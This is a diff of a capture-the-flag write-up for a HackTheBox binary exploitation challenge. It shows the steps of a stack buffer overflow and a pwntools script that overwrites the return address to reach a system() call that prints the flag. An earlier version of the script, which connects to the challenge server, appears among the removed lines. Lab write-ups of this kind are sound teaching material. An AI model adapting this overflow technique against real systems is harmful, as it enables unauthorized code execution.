@@ -9,94 +9,113 @@ Can you disable the mechanisms and take control of the Admin Panel?
 ## HINT:
 - NONE
 ## STEPS:
-1. First, unzipt the `.zip` file given, then jump to the extracted directory.
+1. Unzipping the zip file resulting to a 64 bit binary file.
 
-> INSIDE
-
-![image](https://user-images.githubusercontent.com/70703371/209360739-725aaa02-8f61-4120-8fe3-a89e10e29d4f.png)
+![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/7891a42f-5843-4d71-ac5b-7667676e6464)
 
 
-2. Check the `sp` file type.
+2. Let's check the binary's protections.
 
-![image](https://user-images.githubusercontent.com/70703371/209360801-f1ee46de-d6b9-441f-8716-d216f4f64f87.png)
-
-
-3. It's a 64 bit binary file, dynamically linked, and not stripped.
-4. Since it's not stripped, it's easier for us to debug the binary when decompiled.
-5. Now, let's check the binary's protection.
-
-> RESULT
-
-![image](https://user-images.githubusercontent.com/70703371/209361035-8d8bd5e7-d939-4437-b3cd-6a96cdd17b8c.png)
+![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/0e695117-aab9-468e-919e-be825df29cbc)
 
 
-6. **No canary found** and **no PIE**.
-7. Anyway let's run the binary in gdb.
+3. Let's decompile the binary.
+4. At the `main()` function, the `admin_panel()` function shall be our interest because it's where our input accepted.
 
-> RESULT
-
-![image](https://user-images.githubusercontent.com/70703371/209473239-d41f9b73-858d-4dd0-9223-5986a21548f4.png)
+![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/b5c990b1-807d-401c-9ff1-d311b50d39cd)
 
 
-8. If we pressed 1, we prompted an input, let's paste 1024 cyclic pattern here.
+5. We can get the flag if our previous parameters are the same as these:
 
-> RESULT
-
-![image](https://user-images.githubusercontent.com/70703371/209473266-0c10cff2-bbd9-48c5-a3ac-68f72b55c73f.png)
+![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/11312e9c-cff6-4c7a-9645-074ee185edf4)
 
 
-9. Great! The program crashed.
-10. Now utilize the 4 RBP characters from behind to find the correct bytes to overflow the buffer.
+6. Anyway there's a `system()` call that auto cat the flag.
 
-> RESULT
-
-![image](https://user-images.githubusercontent.com/70703371/209473284-21caf80f-6b5e-43bb-a01d-a7a47c830810.png)
+![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/94239da8-ad83-443d-885c-80c0740dfeed)
 
 
-11. Notice here, since we don't have the RSP offset, so let's use the pattern buffer found -1. -> 56 padding bytes.
-
-![image](https://user-images.githubusercontent.com/70703371/209473313-4a1164a2-86a0-4472-810b-d4e975dcab00.png)
+![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/4471baf8-7d30-4303-8565-84929f5592f7)
 
 
-12. Anyway let's decompile the file and open the `main()` function.
+7. Hence the pwn concept is to control the RIP by overflowing the buffer then add the `lea` offset.
 
-> RESULT
+```
+padding + lea_offset
+```
 
-![image](https://user-images.githubusercontent.com/70703371/209363588-d2254810-2ab9-4416-b90f-70456ee2c0e1.png)
+8. First we need to find the offset for RIP.
+9. Let's use peda.
 
-13. From the 3 functions, the `admin_panel()` function caught my attention.
-
-> ADMIN_PANEL
-
-![image](https://user-images.githubusercontent.com/70703371/209363750-d34aaf84-613b-4005-9ce2-1594255bcf83.png)
+![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/3d4087da-394d-4189-b8ee-b356d7ae7a3d)
 
 
-14. Based from the source code, the read function reads 57 bytes and the program comparing the admin username with the newline after it not a NULL character.
-15. By the way, actually we can get the `system()` address and add that as the return address.
-16. Here is the full script.
+10. Sadly it does not show us the bytes, hence we need to find it manually.
+11. But the problem is, since we want to use the `system()` approach, hence we can't determine if the padding is correct or not, because it shall gave us the "EOF" statement.
+12. Then let's assume to use 57 right now.
+13. Next, grab the `lea` offset
+
+![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/f93f106f-32b7-4525-85b8-a9ccf7d4c8db)
+
+
+14. Let's craft the script.
+
+> THE SCRIPT
 
 ```py
 from pwn import *
 import os
 
 os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:  
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  
+        return process([exe] + argv, *a, **kw)
+
+exe = './sp_going_deeper'
+elf = context.binary = ELF(exe, checksec=True)
 context.log_level = 'debug'
-sh = remote('144.126.232.222',30851)
-p = b'A' * 56
-p += p64(4197138) #0x400b12 # system address
-sh.sendlineafter(b'>>', b'1')
+
+sh = start()
+
+padding = 57 
+
+lea_offset = 0x0000000000400b12
+info('lea offset --> %#0x', lea_offset)
+
+p = flat([
+    asm('nop') * padding,
+    lea_offset
+])
+
+sh.sendlineafter(b'>', b'1')
 sh.sendlineafter(b':', p)
-
 sh.interactive()
-
 ```
 
-> OUTPUT
+> RESULT
 
-![image](https://user-images.githubusercontent.com/70703371/209473377-a05186c4-8306-45a1-b6c5-3c2fbc0785dc.png)
+![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/7af41ac8-6d87-4a6a-8d8b-170c9780f195)
 
 
-17. Got the flag!
+15. Let's lowered it to 56.
+
+> RESULT
+
+![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/84427b43-f406-43bc-bcc1-ba5fb0bd3f1a)
+
+
+16. Got the flag!
+17. Let's test it remotely then.
+
+> RESULT
+
+![Uploading image.png…]()
+
+
+18. Got the flag!
 
 ## FLAG
 
